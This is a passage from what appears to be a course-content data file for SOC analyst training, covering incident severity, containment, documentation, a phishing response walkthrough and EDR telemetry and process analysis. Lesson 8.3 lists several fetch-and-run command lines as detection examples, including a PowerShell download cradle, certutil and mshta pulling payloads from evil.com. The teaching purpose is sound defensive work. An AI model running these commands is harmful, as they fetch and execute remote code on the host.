│ • Compromised admin credentials                              │
│ • Successful phishing with credential theft                  │
│ • C2 communication detected                                  │
│                                                              │
│ Response: Urgent, IR team engaged                            │
│ SLA: 1 hour initial response                                 │
└──────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────┐
│ SEVERITY 3 - MEDIUM                                          │
├──────────────────────────────────────────────────────────────┤
│ • Malware contained on single endpoint                       │
│ • Phishing email clicked, no credential entry                │
│ • Policy violations detected                                 │
│ • Suspicious but unconfirmed activity                        │
│                                                              │
│ Response: Same-day investigation                             │
│ SLA: 4 hours initial response                                │
└──────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────┐
│ SEVERITY 4 - LOW                                             │
├──────────────────────────────────────────────────────────────┤
│ • Blocked malware attempt                                    │
│ • Reported phishing (not clicked)                            │
│ • Minor policy violation                                     │
│ • False positive after investigation                         │
│                                                              │
│ Response: Next business day                                  │
│ SLA: 24 hours initial response                               │
└──────────────────────────────────────────────────────────────┘
\`\`\`

## Factors Affecting Severity

### Asset Criticality

\`\`\`
Question: What system is affected?

├── Domain Controller     → Increase severity
├── Database server       → Increase severity
├── Executive workstation → Increase severity
├── Standard workstation  → Normal severity
└── Test/Dev server       → Decrease severity
\`\`\`

### Data Sensitivity

\`\`\`
Question: What data is at risk?

├── PII/PHI/PCI data     → Increase severity
├── Trade secrets        → Increase severity
├── Financial data       → Increase severity
├── Internal documents   → Normal severity
└── Public information   → Decrease severity
\`\`\`

### Scope and Spread

\`\`\`
Question: How widespread?

├── Multiple departments → Increase severity
├── Multiple systems     → Increase severity
├── Single system        → Normal severity
└── Contained quickly    → Decrease severity
\`\`\`

## Classification Decision Tree

\`\`\`
                    Security Event Detected
                            │
                            ↓
              ┌─────────────────────────┐
              │ Is this a real threat? │
              └───────────┬─────────────┘
                    │           │
                   Yes          No → Document & Close
                    │
                    ↓
              ┌─────────────────────────┐
              │ What category of attack?│
              └───────────┬─────────────┘
                          │
                          ↓
              ┌─────────────────────────┐
              │ What assets affected?   │
              └───────────┬─────────────┘
                          │
                          ↓
              ┌─────────────────────────┐
              │ What is the impact?     │
              └───────────┬─────────────┘
                          │
                          ↓
                  Assign Severity
                          │
                          ↓
                Follow Response SLA
\`\`\`
    `,
    keyTakeaways: [
      "Distinguish between events, alerts, and confirmed incidents",
      "Classify incidents by attack type and impact (CIA triad)",
      "Severity levels determine response urgency and resource allocation",
      "Asset criticality and data sensitivity affect severity assignment",
      "Use a consistent decision tree for objective classification"
    ],
    practicalExercise: {
      title: "Incident Classification Exercise",
      description: "Practice classifying sample incidents by type and severity.",
      steps: [
        "Review 5 sample incident scenarios",
        "Classify each by attack category",
        "Assign severity level (1-4)",
        "Document your reasoning for each classification",
        "Compare with the provided answer key"
      ]
    }
  },
  {
    id: "7.3",
    courseId: "soc-fundamentals",
    title: "Initial Containment Actions",
    content: `
# Initial Containment Actions

**Containment** is the critical phase where you stop the bleeding. Quick, decisive containment can mean the difference between a minor incident and a major breach.

## Containment Philosophy

> "Contain first, investigate second - but don't destroy evidence"

**Key Principles:**
1. Stop the spread of the attack
2. Preserve evidence for investigation
3. Minimize business disruption
4. Document all actions taken

## Common Containment Strategies

### Network Isolation

**Full Network Isolation:**
\`\`\`
Action: Disconnect host from network
When: Active ransomware, confirmed C2, lateral movement

Methods:
• Disable switch port
• Block at firewall
• EDR network isolation feature
• Disable network adapter (if physical access)
\`\`\`

**Selective Blocking:**
\`\`\`
Action: Block specific traffic
When: Known malicious IPs/domains, C2 beaconing

Methods:
• Firewall rules
• DNS sinkhole
• Proxy blocks
• WAF rules
\`\`\`

### Account Actions

\`\`\`
COMPROMISED ACCOUNT CONTAINMENT

1. Disable the account
   └─ AD: Disable in Users & Computers
   └─ Cloud: Suspend in admin console

2. Terminate active sessions
   └─ Force logout from all devices
   └─ Revoke OAuth tokens

3. Reset credentials
   └─ Password reset (force at next login)
   └─ Revoke/regenerate API keys

4. Review recent activity
   └─ Check login history
   └─ Review permission changes
\`\`\`

### Endpoint Containment

**EDR Containment:**
\`\`\`
Most EDR tools offer:
• Network isolation (blocks all except EDR traffic)
• Process termination
• File quarantine
• Remediation actions
\`\`\`

**Manual Containment:**
\`\`\`
If no EDR available:
• Power off (last resort - loses volatile data)
• Unplug network cable
• Login and disable network adapter
• Move to quarantine VLAN
\`\`\`

## Containment by Incident Type

### Malware Infection

\`\`\`
IMMEDIATE ACTIONS:
□ Isolate affected host(s) from network
□ Identify malware family if possible
□ Check for lateral movement indicators
□ Block C2 communications at firewall
□ Preserve memory for analysis (if possible)

DON'T:
✗ Immediately reboot/wipe (destroys evidence)
✗ Run antivirus before collecting artifacts
✗ Alert the attacker you've detected them
\`\`\`

### Phishing with Credential Compromise

\`\`\`
IMMEDIATE ACTIONS:
□ Reset user's password
□ Terminate all active sessions
□ Review account activity since compromise
□ Check for mail forwarding rules
□ Alert user and manager
□ Block sender domain/IP

ADDITIONAL STEPS:
□ Search for similar emails to other users
□ Check if MFA was bypassed
□ Review VPN/remote access logs
\`\`\`

### Ransomware

\`\`\`
CRITICAL - EVERY SECOND COUNTS!

□ IMMEDIATELY isolate affected systems
□ DO NOT power off (may trigger encryption)
□ Identify patient zero if possible
□ Block lateral movement paths
□ Disable network shares
□ Contact IR team/management ASAP

PRESERVE:
□ Ransom notes (file and screenshot)
□ Encrypted file samples
□ Running processes and memory
□ Network connections at time of detection
\`\`\`

### Unauthorized Access

\`\`\`
IMMEDIATE ACTIONS:
□ Lock out the suspicious account
□ Terminate active connections
□ Block source IP address
□ Review what was accessed
□ Check for new accounts created
□ Look for persistence mechanisms
\`\`\`

## Containment Decision Matrix

| Factor | Aggressive Containment | Conservative Containment |
|--------|------------------------|--------------------------|
| Impact | High/Critical severity | Low/Medium severity |
| Spread | Active lateral movement | Isolated to one system |
| Data | Sensitive data at risk | No sensitive data |
| Business | Non-critical system | Business-critical system |
| Evidence | Evidence preserved | More evidence needed |

## Documentation During Containment

**Record Everything:**
\`\`\`
Containment Log Template:

Timestamp: [YYYY-MM-DD HH:MM:SS UTC]
Action: [What you did]
Target: [System/Account affected]
Method: [How you did it]
Reason: [Why this action]
Result: [Outcome observed]
Analyst: [Your name]

Example:
Timestamp: 2024-01-15 14:32:15 UTC
Action: Network isolation via EDR
Target: WORKSTATION-042 (10.0.1.42)
Method: CrowdStrike network contain
Reason: Confirmed Cobalt Strike beacon
Result: Beaconing stopped, host isolated
Analyst: J. Smith
\`\`\`
    `,
    keyTakeaways: [
      "Containment stops the attack spread while preserving evidence",
      "Network isolation is often the fastest containment method",
      "Account compromise requires password reset and session termination",
      "Ransomware demands immediate isolation - every second counts",
      "Document every containment action with timestamps"
    ],
    practicalExercise: {
      title: "Containment Scenario Practice",
      description: "Work through containment decisions for different incident types.",
      steps: [
        "Review the phishing scenario and list containment steps",
        "Review the ransomware scenario and prioritize actions",
        "For each scenario, document what you would NOT do and why",
        "Create a containment log for one scenario",
        "Identify potential business impact of your containment choices"
      ]
    }
  },
  {
    id: "7.4",
    courseId: "soc-fundamentals",
    title: "Incident Documentation",
    content: `
# Incident Documentation

**Excellent documentation** is the backbone of effective incident response. Good notes enable continuity, legal defensibility, and organizational learning.

## Why Documentation Matters

- **Continuity** - Others can pick up where you left off
- **Legal/Compliance** - May be needed for legal proceedings
- **Metrics** - Enable measurement and improvement
- **Learning** - Support post-incident reviews
- **Communication** - Keep stakeholders informed

## The Incident Ticket

Every incident needs a ticket. Key fields:

\`\`\`
INCIDENT TICKET STRUCTURE

┌─────────────────────────────────────────────────────────────┐
│ TICKET HEADER                                               │
├─────────────────────────────────────────────────────────────┤
│ Ticket ID: INC-2024-0142                                    │
│ Title: Emotet Malware - Marketing Department                │
│ Severity: HIGH (2)                                          │
│ Status: Containment                                         │
│ Assigned: SOC Team                                          │
│ Created: 2024-01-15 14:22 UTC                               │
│ Last Updated: 2024-01-15 16:45 UTC                          │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ INCIDENT DETAILS                                            │
├─────────────────────────────────────────────────────────────┤
│ Category: Malware                                           │
│ Subcategory: Emotet/Banking Trojan                          │
│ Attack Vector: Email Attachment (Word macro)                │
│ Affected Systems: MKTG-PC-012, MKTG-PC-017                  │
│ Affected Users: jsmith@company.com, mwilson@company.com     │
│ Data Impacted: TBD - under investigation                    │
│ Business Impact: Marketing team offline                     │
└─────────────────────────────────────────────────────────────┘
\`\`\`

## Timeline Documentation

Record every action with timestamps:

\`\`\`
INCIDENT TIMELINE

[2024-01-15 13:45 UTC] - Initial Alert
EDR alert: Suspicious PowerShell execution on MKTG-PC-012
Alert ID: CRW-4521, Severity: High

[2024-01-15 13:52 UTC] - Triage Initiated
Analyst J. Chen began investigation
Initial finding: PowerShell downloading payload from external URL

[2024-01-15 14:05 UTC] - Malware Identified
VirusTotal analysis: Emotet variant
Hash: abc123def456...
First seen: 2024-01-10

[2024-01-15 14:15 UTC] - Second System Identified
Review shows MKTG-PC-017 also compromised
Same malware, same timeframe

[2024-01-15 14:22 UTC] - Incident Declared
Escalated to Severity 2 Incident
IR Lead notified, ticket created

[2024-01-15 14:30 UTC] - Containment Initiated
Both systems isolated via EDR
Network connection blocked at firewall

[2024-01-15 15:00 UTC] - Email Analysis
Phishing email identified
Subject: "Invoice Q4-2024"
Sent to 23 users, 2 clicked
\`\`\`

## Evidence Collection Notes

Document what you collected and where:

\`\`\`
EVIDENCE LOG

┌────────┬──────────────────────────────────────────────────────┐
│ ID     │ E001                                                 │
├────────┼──────────────────────────────────────────────────────┤
│ Type   │ Memory Dump                                          │
│ Source │ MKTG-PC-012                                          │
│ Hash   │ SHA256: f4d2a9c8...                                  │
│ Time   │ 2024-01-15 14:35 UTC                                 │
│ Method │ FTK Imager                                           │
│ Chain  │ Collected by J. Chen, stored at \\forensics\\INC142   │
└────────┴──────────────────────────────────────────────────────┘

┌────────┬──────────────────────────────────────────────────────┐
│ ID     │ E002                                                 │
├────────┼──────────────────────────────────────────────────────┤
│ Type   │ Malicious Email                                      │
│ Source │ Exchange Server                                      │
│ Hash   │ SHA256: a8b7c6d5...                                  │
│ Time   │ 2024-01-15 15:12 UTC                                 │
│ Method │ Email export (EML format)                            │
│ Chain  │ Collected by SOC, stored at \\forensics\\INC142       │
└────────┴──────────────────────────────────────────────────────┘
\`\`\`

## Communication Templates

### Initial Notification

\`\`\`
SUBJECT: [Severity 2] Security Incident - Marketing Department

Status: ACTIVE
Ticket: INC-2024-0142

Summary:
Malware infection detected on two Marketing workstations. 
Initial analysis indicates Emotet banking trojan delivered via 
phishing email.

Current Actions:
• Affected systems isolated from network
• Investigation ongoing
• Email team blocking malicious sender

Impact:
• Two Marketing users offline
• No confirmed data loss at this time

Next Update: Within 2 hours
Contact: SOC Team - soc@company.com
\`\`\`

### Status Update

\`\`\`
SUBJECT: [UPDATE] INC-2024-0142 - Containment Complete

Status: ERADICATION IN PROGRESS
Last Update: 2 hours ago

Progress:
✓ All affected systems isolated (2 workstations)
✓ Malware identified and analyzed
✓ Phishing email removed from all mailboxes
✓ C2 domains blocked at firewall
→ Currently reimaging affected systems
→ User credential reset in progress

Remaining Work:
• Complete system reimaging (~2 hours)
• User awareness communication
• Update detection rules

Estimated Resolution: 4 hours

Next Update: Upon resolution or significant change
\`\`\`

## Best Practices

### The 5 W's + H

For every entry, capture:
- **Who** - Actor/analyst involved
- **What** - Action taken or observed
- **When** - Timestamp (UTC)
- **Where** - System/location
- **Why** - Reasoning for action
- **How** - Method/tools used

### Documentation Don'ts

\`\`\`
✗ Don't use vague language ("I saw something weird")
✗ Don't forget timestamps
✗ Don't editorialize or speculate without marking it
✗ Don't document passwords or sensitive data in clear text
✗ Don't wait until the end to document
\`\`\`
    `,
    keyTakeaways: [
      "Documentation enables continuity, legal defense, and learning",
      "Every incident needs a ticket with consistent fields",
      "Maintain detailed timelines with UTC timestamps",
      "Log all evidence with chain of custody information",
      "Use the 5 W's + H for comprehensive entries"
    ],
    practicalExercise: {
      title: "Incident Documentation Practice",
      description: "Create complete documentation for a sample incident.",
      steps: [
        "Fill out an incident ticket template",
        "Build a timeline with at least 10 entries",
        "Create an evidence log entry",
        "Draft an initial notification email",
        "Write a status update for stakeholders"
      ]
    }
  },
  {
    id: "7.5",
    courseId: "soc-fundamentals",
    title: "Hands-On: Phishing Incident Response",
    content: `
# Hands-On: Phishing Incident Response

Let's walk through a complete phishing incident from detection to resolution. This exercise simulates real SOC work.

## Scenario

\`\`\`
ALERT RECEIVED

Source: Email Security Gateway
Time: 2024-01-15 09:22:15 UTC
Alert: User clicked malicious URL in email
Details:
- User: sarah.jones@company.com
- Subject: "Urgent: Password Expiry Notice"
- Sender: it-support@c0mpany.com (note the zero)
- Link Clicked: https://c0mpany-auth.evil.site/reset
\`\`\`

## Phase 1: Detection & Initial Analysis

### Email Analysis

\`\`\`
FROM: it-support@c0mpany.com
TO: sarah.jones@company.com
DATE: 2024-01-15 09:15:22 UTC
SUBJECT: Urgent: Password Expiry Notice

--- BEGIN EMAIL BODY ---
Dear Employee,

Your password will expire in 24 hours. Click below to reset:

[Reset Password Now]
https://c0mpany-auth.evil.site/reset?id=a8b7c6...

IT Support Team

--- END EMAIL BODY ---
\`\`\`

**Red Flags Identified:**
\`\`\`
□ Sender domain uses "0" instead of "o" (c0mpany vs company)
□ Urgency tactics ("will expire in 24 hours")
□ Generic greeting ("Dear Employee")
□ External link disguised as internal
□ No SPF/DKIM authentication
\`\`\`

### User Contact

\`\`\`
PHONE CALL TO USER (9:35 AM)

Analyst: "Hi Sarah, this is the Security team. We noticed 
         you clicked a link in an email about password reset.
         Did you enter any credentials?"

Sarah: "Yes, it asked for my password and I typed it in.
        It said there was an error and to try again later."

Analyst: "Thank you for being honest. I'll need to secure 
         your account and ask you some questions. Please don't
         access any sensitive systems until we're done."
\`\`\`

**Critical Finding:** User entered credentials on phishing page!

## Phase 2: Containment

### Immediate Actions Taken

\`\`\`
[09:38 UTC] - Password Reset
Action: Reset Sarah's password in Active Directory
Result: Previous password invalidated

[09:40 UTC] - Session Termination
Action: Terminated all active sessions for sarah.jones
- O365 sessions cleared
- VPN sessions terminated
- SSO tokens revoked

[09:42 UTC] - Block Malicious Infrastructure
Action: Added to firewall blocklist
- Domain: c0mpany-auth.evil.site
- IP: 185.234.218.45

[09:45 UTC] - Email Removal
Action: Searched and removed email from all mailboxes
Result: Found in 47 mailboxes, removed from all
Clicked by: 3 users total
\`\`\`

### Scope Assessment

\`\`\`
AFFECTED USERS ANALYSIS

User 1: sarah.jones@company.com
- Clicked link: YES
- Entered credentials: YES
- Status: COMPROMISED → Reset complete

User 2: mike.wilson@company.com  
- Clicked link: YES
- Entered credentials: NO (closed page)
- Status: No action needed

User 3: lisa.chen@company.com
- Clicked link: YES
- Entered credentials: Unknown
- Status: INVESTIGATING → Calling now
\`\`\`

## Phase 3: Investigation

### Account Activity Review

\`\`\`
SARAH.JONES ACCOUNT ACTIVITY (Last 24 hours)

Normal Activity (Before 9:22 UTC):
- 08:00 - Logged into workstation
- 08:05 - Accessed O365, normal email use
- 08:30 - Joined Teams meeting

Suspicious Activity (After credential entry):
- 09:25 - Login from unusual IP (91.109.190.68) → ATTACKER
- 09:26 - Email forwarding rule created
- 09:27 - Accessed SharePoint finance folder
- 09:28 - Downloaded 3 Excel files

Post-Containment:
- 09:38 - Password changed (by SOC)
- 09:40 - Sessions terminated
- No further access attempts
\`\`\`

### Malicious Actions Detected

\`\`\`
1. EMAIL FORWARDING RULE
   Rule: "Auto-Forward"
   Condition: All emails
   Forward to: external@attacker.com
   Action: DELETED

2. FILE ACCESS
   Files accessed from attacker IP:
   - Q4-Financial-Report.xlsx
   - Budget-2024.xlsx
   - Employee-Salary-Data.xlsx
   
   Status: POTENTIAL DATA BREACH
   Escalation: Required - sensitive data accessed
\`\`\`

## Phase 4: Eradication & Recovery

### Cleanup Actions

\`\`\`
□ Malicious forwarding rule removed
□ Password reset completed
□ MFA enforced on account
□ User briefed on incident
□ Workstation scanned (clean)
\`\`\`

### Recovery

\`\`\`
□ User provided new temporary password
□ MFA enrollment completed
□ User returned to normal duties at 11:30 UTC
□ Monitoring period: 30 days
\`\`\`

## Phase 5: Post-Incident

### Incident Summary

\`\`\`
INCIDENT REPORT: INC-2024-0087

Duration: 9:22 - 11:30 UTC (2 hours, 8 minutes)
Severity: HIGH (2)
Category: Phishing → Credential Theft → Data Access

Impact:
- 1 user account compromised
- 3 financial files accessed by attacker
- Email forwarding rule created

Root Cause:
- Convincing phishing email bypassed email security
- User did not recognize typosquatted domain
- No MFA on affected account

Actions Taken:
- Credentials reset
- Sessions terminated  
- Malicious infrastructure blocked
- Attacker's email forward rule removed
- MFA enforced

Recommendations:
1. Enable MFA for all users (not just some)
2. Improve email filtering for typosquatting
3. Conduct phishing awareness training
4. Review accessed files for data classification
5. Consider data breach notification requirements
\`\`\`

### Lessons Learned

**What Went Well:**
- Fast detection from email gateway
- Quick containment actions
- Good user cooperation

**What Could Improve:**
- MFA should have been enabled already
- User training on recognizing phishing
- Faster escalation on data access

**Action Items:**
| Action | Owner | Due Date |
|--------|-------|----------|
| MFA rollout | IT | 2 weeks |
| Phishing training | HR/Sec | 1 week |
| Email filter tuning | Email Team | 3 days |
| Data breach assessment | Legal | 1 day |
    `,
    keyTakeaways: [
      "Phishing response requires quick credential reset and session termination",
      "Always check for mail forwarding rules set by attackers",
      "Document attacker activity timeline for scope assessment",
      "Data access by attackers may trigger breach notification requirements",
      "Post-incident improvements prevent similar attacks"
    ],
    practicalExercise: {
      title: "Complete Phishing IR Exercise",
      description: "Work through a phishing incident using the provided scenario.",
      steps: [
        "Analyze the phishing email and list all indicators",
        "Create a containment action checklist",
        "Document a timeline of the incident",
        "Draft a user notification message",
        "Write three recommendations for prevention"
      ]
    }
  },

  // =========================================
  // MODULE 8: ENDPOINT DETECTION & RESPONSE
  // =========================================
  {
    id: "8.1",
    courseId: "soc-fundamentals",
    title: "What is EDR?",
    content: `
# What is EDR?

**Endpoint Detection and Response (EDR)** is a security technology that continuously monitors endpoints to detect, investigate, and respond to cyber threats.

## Evolution of Endpoint Security

\`\`\`
Traditional Antivirus              EDR
        │                           │
  Signature-based            Behavioral analysis
  Periodic scans             Real-time monitoring
  Known threats only         Unknown threat detection
  Limited visibility         Full telemetry
  Manual response            Automated response
\`\`\`

## Core EDR Capabilities

### 1. Continuous Monitoring

EDR agents run 24/7, watching:
- Process execution
- File system changes
- Registry modifications
- Network connections
- Memory operations
- User activities

### 2. Detection

\`\`\`
DETECTION METHODS

┌─────────────────────────────────────────────────────────┐
│  Signature-Based                                        │
│  └─ Known malware hashes, patterns                      │
├─────────────────────────────────────────────────────────┤
│  Behavioral Analysis                                    │
│  └─ Suspicious behavior patterns (even for new threats) │
├─────────────────────────────────────────────────────────┤
│  Machine Learning                                       │
│  └─ Anomaly detection, classification models            │
├─────────────────────────────────────────────────────────┤
│  Threat Intelligence                                    │
│  └─ IOCs from global threat feeds                       │
└─────────────────────────────────────────────────────────┘
\`\`\`

### 3. Investigation

EDR provides rich data for investigation:
- Full process tree visualization
- File and registry timeline
- Network connection history
- User session context
- Related alerts and incidents

### 4. Response

Automated and manual response options:

| Capability | Description |
|------------|-------------|
| Isolate | Cut off network access |
| Kill Process | Terminate malicious processes |
| Quarantine | Isolate suspicious files |
| Remediate | Remove malware and artifacts |
| Rollback | Restore to previous state |

## EDR Architecture

\`\`\`
                    ┌─────────────────────────────────┐
                    │     EDR Management Console      │
                    │  (Cloud or On-Premise)          │
                    └─────────────┬───────────────────┘
                                  │
              ┌───────────────────┼───────────────────┐
              │                   │                   │
              ↓                   ↓                   ↓
    ┌─────────────────┐ ┌─────────────────┐ ┌─────────────────┐
    │   EDR Agent     │ │   EDR Agent     │ │   EDR Agent     │
    │   Workstation   │ │     Server      │ │     Laptop      │
    └─────────────────┘ └─────────────────┘ └─────────────────┘
           │                   │                   │
           ↓                   ↓                   ↓
    ┌─────────────────────────────────────────────────────────┐
    │              Telemetry Data Collection                   │
    │  • Processes  • Files  • Registry  • Network  • Memory  │
    └─────────────────────────────────────────────────────────┘
\`\`\`

## Popular EDR Solutions

### Enterprise Solutions

| Vendor | Product | Key Strength |
|--------|---------|--------------|
| CrowdStrike | Falcon | Cloud-native, threat intel |
| Microsoft | Defender for Endpoint | Windows integration |
| SentinelOne | Singularity | AI-powered automation |
| Carbon Black | CB Defense | Process visibility |
| Palo Alto | Cortex XDR | Multi-vector detection |

### What SOC Analysts Need to Know

**Console Navigation:**
- Dashboard and alert queue
- Host search and investigation
- Process tree analysis
- Response action execution

**Key Skills:**
- Understanding alert severity and confidence
- Process tree interpretation
- File and registry analysis
- Network connection review
- Response action selection

## EDR vs Traditional AV

\`\`\`
Feature           │ Antivirus │ EDR
──────────────────┼───────────┼──────────
Detection Method  │ Signatures│ Behavioral + Signatures
Visibility        │ Limited   │ Full telemetry
Investigation     │ Basic     │ Rich context
Response          │ Block only│ Isolate, remediate, rollback
Threat Hunting    │ No        │ Yes
Cloud Analysis    │ No        │ Yes
Cost              │ Low       │ Higher
\`\`\`

## Why EDR Matters for SOC

1. **Rich Telemetry** - See exactly what happened
2. **Fast Response** - Contain threats in seconds
3. **Investigation Power** - Drill down into details
4. **Threat Hunting** - Proactively search for threats
5. **Automation** - Reduce manual workload
    `,
    keyTakeaways: [
      "EDR provides continuous endpoint monitoring and behavioral detection",
      "Core capabilities: monitoring, detection, investigation, and response",
      "EDR offers rich telemetry including process, file, registry, and network data",
      "Response actions include isolation, process termination, and remediation",
      "SOC analysts use EDR for alert investigation and threat containment"
    ],
    additionalResources: [
      { title: "CrowdStrike University", type: "documentation", url: "https://www.crowdstrike.com" },
      { title: "Microsoft Defender for Endpoint Docs", type: "documentation", url: "https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/" }
    ]
  },
  {
    id: "8.2",
    courseId: "soc-fundamentals",
    title: "EDR Alerts & Telemetry",
    content: `
# EDR Alerts & Telemetry

Understanding EDR alerts and the telemetry behind them is crucial for effective investigation.

## Anatomy of an EDR Alert

\`\`\`
┌─────────────────────────────────────────────────────────────────┐
│ ALERT: Suspicious PowerShell Execution                         │
├─────────────────────────────────────────────────────────────────┤
│ Severity: HIGH      Confidence: 90%      Category: Execution   │
├─────────────────────────────────────────────────────────────────┤
│ Hostname: FINANCE-PC-08                                         │
│ Username: jsmith                                                 │
│ Timestamp: 2024-01-15 14:22:35 UTC                              │
├─────────────────────────────────────────────────────────────────┤
│ Detection: PowerShell with encoded command spawned from        │
│           suspicious parent process (WINWORD.EXE)              │
├─────────────────────────────────────────────────────────────────┤
│ Process: powershell.exe -enc aQBlAHgAIAAoAG4AZQB3AC0A...      │
│ Parent:  WINWORD.EXE (Microsoft Word)                          │
│ File:    C:\\Users\\jsmith\\Downloads\\Invoice.doc              │
├─────────────────────────────────────────────────────────────────┤
│ MITRE ATT&CK: T1059.001 - PowerShell                           │
│              T1566.001 - Spear Phishing Attachment             │
└─────────────────────────────────────────────────────────────────┘
\`\`\`

## Alert Severity Levels

| Level | Description | Typical Response |
|-------|-------------|------------------|
| Critical | Active attack, high confidence | Immediate action |
| High | Likely malicious, investigation needed | Priority review |
| Medium | Suspicious, may be benign | Same-day triage |
| Low | Anomalous but likely benign | Batch review |
| Informational | Context for other alerts | Reference only |

## Types of EDR Telemetry

### Process Telemetry

\`\`\`
PROCESS EVENT

Event Type: Process Creation
Timestamp: 2024-01-15 14:22:35.421 UTC

Process Details:
├── PID: 4892
├── Name: powershell.exe
├── Path: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
├── Command Line: powershell.exe -enc aQBlAHgAIAAoAG4AZQB3AC0A...
├── Hash (SHA256): a5d2f8...
├── Signature: Signed by Microsoft
└── Integrity Level: Medium

Parent Process:
├── PID: 2156
├── Name: WINWORD.EXE
├── Path: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE
└── User: DOMAIN\\jsmith
\`\`\`

### File Telemetry

\`\`\`
FILE EVENTS

[WRITE] 14:22:34.102 UTC
Path: C:\\Users\\jsmith\\AppData\\Local\\Temp\\payload.dll
Size: 245,760 bytes
Hash: b7c8d9e0f1...
Written by: powershell.exe (PID 4892)

[EXECUTE] 14:22:35.891 UTC
Path: C:\\Users\\jsmith\\AppData\\Local\\Temp\\payload.dll
Loaded by: rundll32.exe (PID 5124)
Export: DllRegisterServer
\`\`\`

### Network Telemetry

\`\`\`
NETWORK CONNECTIONS

[OUTBOUND] 14:22:36.156 UTC
Process: rundll32.exe (PID 5124)
Source: 10.0.1.108:49822
Destination: 185.234.218.45:443
Protocol: HTTPS
Bytes Sent: 1,024
Bytes Received: 2,048
Status: Established

[DNS] 14:22:35.982 UTC
Query: evil-c2-server.com
Response: 185.234.218.45
Requested by: payload.dll (loaded in rundll32.exe)
\`\`\`

### Registry Telemetry

\`\`\`
REGISTRY EVENTS

[SETVALUE] 14:22:37.234 UTC
Key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
Value: Updater
Data: C:\\Users\\jsmith\\AppData\\Local\\Temp\\payload.dll
Process: rundll32.exe (PID 5124)

Analysis: Persistence mechanism - runs on user login
\`\`\`

## Reading Process Trees

Process trees show parent-child relationships:

\`\`\`
PROCESS TREE VISUALIZATION

explorer.exe (PID 1024)
└── outlook.exe (PID 2048)
    └── WINWORD.EXE (PID 2156)        [!] Opened malicious doc
        └── powershell.exe (PID 4892) [!] Encoded command
            └── rundll32.exe (PID 5124)[!] Loaded payload

SUSPICIOUS INDICATORS:
• Office app spawning PowerShell
• Encoded PowerShell commands
• rundll32 executing downloaded DLL
\`\`\`

### Normal vs Suspicious Trees

**Normal:**
\`\`\`
explorer.exe
└── chrome.exe
    └── chrome.exe (child processes)
\`\`\`

**Suspicious:**
\`\`\`
explorer.exe
└── EXCEL.EXE
    └── cmd.exe           [!] Why is Excel running cmd?
        └── powershell.exe [!] PowerShell from cmd from Excel
\`\`\`

## Alert Triage with EDR

### Investigation Workflow

\`\`\`
1. ALERT REVIEW
   └─ Read alert summary and severity
   
2. PROCESS CONTEXT
   └─ Examine process tree
   └─ Check command line arguments
   └─ Review parent process legitimacy

3. FILE ANALYSIS
   └─ Check file reputation
   └─ Review file origin
   └─ Examine modifications

4. NETWORK CONTEXT
   └─ Check destination IP/domain reputation
   └─ Review connection timing
   └─ Look for beaconing patterns

5. USER CONTEXT
   └─ Is this normal for this user?
   └─ Recent user activity
   └─ Login location/time

6. VERDICT
   └─ True positive → Respond
   └─ False positive → Tune
   └─ Needs escalation → Escalate
\`\`\`
    `,
    keyTakeaways: [
      "EDR alerts include severity, confidence, detection logic, and MITRE mapping",
      "Key telemetry types: process, file, network, and registry events",
      "Process trees reveal parent-child relationships and attack chains",
      "Office applications spawning scripting engines is a major red flag",
      "Effective triage combines process, file, network, and user context"
    ],
    practicalExercise: {
      title: "EDR Alert Analysis",
      description: "Practice analyzing EDR alerts and telemetry data.",
      steps: [
        "Review the sample EDR alert provided",
        "Draw the process tree from the telemetry",
        "Identify all suspicious indicators",
        "Determine if the alert is a true or false positive",
        "Document your analysis and verdict"
      ]
    }
  },
  {
    id: "8.3",
    courseId: "soc-fundamentals",
    title: "Process Analysis Basics",
    content: `
# Process Analysis Basics

Understanding process behavior is fundamental to EDR investigation. This lesson covers how to analyze processes for signs of malicious activity.

## Process Fundamentals

Every Windows process has key attributes:

\`\`\`
PROCESS ATTRIBUTES

┌─────────────────────────────────────────────────────────────┐
│ IDENTIFICATION                                              │
├─────────────────────────────────────────────────────────────┤
│ Process Name: powershell.exe                                │
│ PID: 4892                                                   │
│ Parent PID: 2156                                            │
│ Session ID: 1 (user session)                                │
└─────────────────────────────────────────────────────────────┘
│ EXECUTION CONTEXT                                           │
├─────────────────────────────────────────────────────────────┤
│ User: DOMAIN\\jsmith                                         │
│ Integrity Level: Medium                                     │
│ Token Privileges: SeDebugPrivilege (DISABLED)               │
│ Start Time: 2024-01-15 14:22:35 UTC                         │
└─────────────────────────────────────────────────────────────┘
│ FILE INFORMATION                                            │
├─────────────────────────────────────────────────────────────┤
│ Path: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\          │
│ Hash: SHA256 a5d2f8...                                      │
│ Signature: Microsoft Windows                                │
│ Compile Time: 2023-05-15                                    │
└─────────────────────────────────────────────────────────────┘
\`\`\`

## Suspicious Process Indicators

### 1. Unusual Parent-Child Relationships

\`\`\`
SUSPICIOUS SPAWNING PATTERNS

Office Applications → Scripting Engines
├── WINWORD.EXE → powershell.exe    [!]
├── EXCEL.EXE → cmd.exe             [!]
├── OUTLOOK.EXE → wscript.exe       [!]

Browser → System Tools
├── chrome.exe → cmd.exe            [!]
├── firefox.exe → powershell.exe    [!]

Services → Unexpected Children
├── services.exe → cmd.exe          [!]
├── wmiprvse.exe → powershell.exe   [!]
\`\`\`

### 2. Suspicious Command Lines

**Encoded Commands:**
\`\`\`powershell
# Suspicious - Base64 encoded
powershell.exe -enc aQBlAHgAIAAoAG4AZQB3AC0A...

# Suspicious - Download cradle
powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload')

# Suspicious - Bypass flags
powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden
\`\`\`

**Suspicious Parameters:**
\`\`\`cmd
# Hidden execution
cmd.exe /c start /min
wscript.exe //B //E:jscript

# LOLBAS usage
certutil.exe -urlcache -split -f http://evil.com/malware.exe
mshta.exe http://evil.com/payload.hta
\`\`\`

### 3. Unusual Process Paths

\`\`\`
EXPECTED LOCATIONS

powershell.exe  → C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\
cmd.exe         → C:\\Windows\\System32\\
